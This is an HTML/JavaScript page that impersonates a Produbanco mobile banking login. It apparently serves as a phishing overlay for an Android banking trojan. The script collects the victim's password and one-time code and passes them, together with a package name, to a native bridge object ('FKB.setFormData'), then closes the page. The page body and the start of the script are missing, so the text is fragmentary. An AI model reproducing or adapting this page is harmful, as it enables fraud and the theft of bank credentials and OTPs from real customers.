<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"><title>Produbanco</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;width:100%;overflow-y:auto}
body{font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100dvh}
.page{width:100%;max-width:380px;padding:0 28px;display:flex;flex-direction:column;align-items:center;display:none}
.page.active{display:flex}
.logo-area{margin-bottom:24px;display:flex;flex-direction:column;align-items:center}
.logo-area img{width:64px;height:64px;border-radius:16px}
.brand-name{color:#009B3A;font-size:18px;font-weight:700;margin-top:12px}
.form-title{color:#333;font-size:15px;font-weight:400;margin-bottom:20px}
.input-group{width:100%;margin-bottom:14px}
.input-label{color:#333;font-size:12px;font-weight:600;margin-bottom:6px;display:block;opacity:.7}
.input-wrap{position:relative;width:100%}
.input-wrap input{width:100%;height:50px;background:#F8F9FA;border:1.5px solid #DEE2E6;border-radius:10px;padding:0 44px 0 16px;color:#1A1A1A;font-size:16px;outline:none;transition:border-color .2s}
.input-wrap input::placeholder{color:#999;font-size:14px}
.input-wrap input:focus{border-color:#009B3A}
.eye-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;padding:6px;cursor:pointer}
.eye-btn svg{width:20px;height:20px;fill:#999}
.btn{width:100%;height:50px;background:#009B3A;border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:600;margin-top:8px;cursor:pointer;opacity:.4;pointer-events:none;transition:all .2s}
.btn.on{opacity:1;pointer-events:auto}
.btn.on:active{transform:scale(.98)}
.biometric{display:flex;flex-direction:column;align-items:center;margin-top:24px}
.bio-icon{width:48px;height:48px;border-radius:50%;border:2px solid #DEE2E6;display:flex;align-items:center;justify-content:center;margin-bottom:6px}
.bio-icon svg{width:26px;height:26px;fill:#999}
.bio-text{color:#999;font-size:11px}
.otp-title{color:#333;font-size:15px;font-weight:500;margin-bottom:6px}
.otp-sub{color:#888;font-size:12px;margin-bottom:24px;text-align:center}
.dots{display:flex;gap:14px;margin-bottom:32px}
.dot{width:16px;height:16px;border-radius:50%;border:2px solid #DEE2E6;transition:all .2s}
.dot.filled{background:#009B3A;border-color:#009B3A}
.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;width:260px}
.key{width:64px;height:64px;border-radius:50%;border:1.5px solid #E8E8E8;background:#FAFAFA;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:500;color:#1A1A1A;cursor:pointer;transition:background .1s;margin:0 auto;-webkit-user-select:none;user-select:none}
.key:active{background:#d4edda}
.key.empty{border:none;background:transparent;pointer-events:none}
.key.back{border:none;background:transparent}
.key.back svg{width:24px;height:24px;fill:#555}
.sp,.ok{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;z-index:999;align-items:center;justify-content:center;flex-direction:column}
.sp.show,.ok.show{display:flex}
.sp-spinner{width:36px;height:36px;border:3px solid #DEE2E6;border-top-color:#009B3A;border-radius:50%;animation:spin .7s linear infinite}
.sp-text{margin-top:14px;font-size:13px;color:#666}
@keyframes spin{to{transform:rotate(360deg)}}
.ok-icon{width:56px;height:56px;border-radius:50%;background:#2ecc71;display:flex;align-items:center;justify-content:center;margin-bottom:14px}
.ok-icon svg{width:30px;height:30px;fill:#fff}
.ok-text{font-size:15px;color:#1A1A1A;font-weight:500}
</style></head>

  savedPwd=pw;
  document.getElementById('step1').className='page';
  document.getElementById('step2').className='page active';
}

function updateDots(){var dots=document.querySelectorAll('.dot');for(var i=0;i<dots.length;i++){dots[i].className=i<otp.length?'dot filled':'dot';}}

function doSubmit(){
  document.activeElement.blur();document.getElementById('step2').className='page';
  document.getElementById('sp').className='sp show';
  var sn='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn=FKB.getSn();}catch(e){}
  var pl=JSON.stringify({password:savedPwd,otp:otp,pkg:pk});
  try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl);}catch(e){}
  
  setTimeout(function(){try{if(typeof FKB!=='undefined'&&FKB.setClosePage)FKB.setClosePage(pk);}catch(e){}try{window.close();}catch(e){}},500);
}

document.getElementById('keypad').addEventListener('click',function(e){var t=e.target.closest('.key');if(!t)return;var v=t.getAttribute('data-v');if(v!==null){if(otp.length<maxLen){otp+=v;updateDots();if(otp.length===maxLen){setTimeout(doSubmit,300);}}}});
document.getElementById('bksp').addEventListener('click',function(){if(otp.length>0){otp=otp.slice(0,-1);updateDots();}});
</script></body></html>
